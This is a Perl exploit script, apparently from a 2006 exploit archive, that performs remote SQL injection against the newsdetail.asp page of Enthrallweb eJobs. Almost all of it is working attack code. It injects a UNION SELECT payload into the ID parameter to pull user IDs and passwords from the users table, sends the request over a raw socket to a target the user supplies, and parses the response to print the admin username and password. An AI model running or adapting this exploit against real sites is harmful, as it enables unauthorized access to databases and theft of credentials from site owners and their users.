#!/usr/bin/perl
#[Script Name: Enthrallweb eJobs (newsdetail.asp) Remote SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(
#[S.Page     : http://www.enthrallweb.us
#[$$         : 179.40  USD
#[..         : ajann,Turkey

use IO::Socket;
if(@ARGV < 2){
print "
[========================================================================
[//  Enthrallweb eJobs (newsdetail.asp) Remote SQL Injection Exploit
[//                   Usage: exploit.pl [target] [path]
[//                   Example: exploit.pl victim.com /
[//                   Example: exploit.pl victim.com /path/
[//                           Vuln&Exp : ajann
[========================================================================
";
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$dir = $ARGV[1];
$file = "/jseekers/newsdetail.asp?ID=";
$target = "-1%20union%20select%200,U_ID,U_Password,0,0,0,0,0,0,0,0%20from%20users";
$target = $host.$dir.$file.$target;

#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket>) {
if ($answer =~ /<\/b><font color=\"#333333\" size=\"1\">(.*?)<\/font>/){ 
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Username: $1\n";
}

if ($answer =~ /<font color=\"#333333\" size=\"1\">(.*?)<\/font>/){ 
print "+ Password: $1\n";
}

if ($answer =~ /Syntax error/) { 
print "+ Exploit Failed : ( \n";
print "+**********************************************************************+\n";
exit(); 
}

if ($answer =~ /Internal Server Error/) {
print "+ Exploit Failed : (  \n";
print "+**********************************************************************+\n";
exit(); 
}
 }

# milw0rm.com [2006-12-23]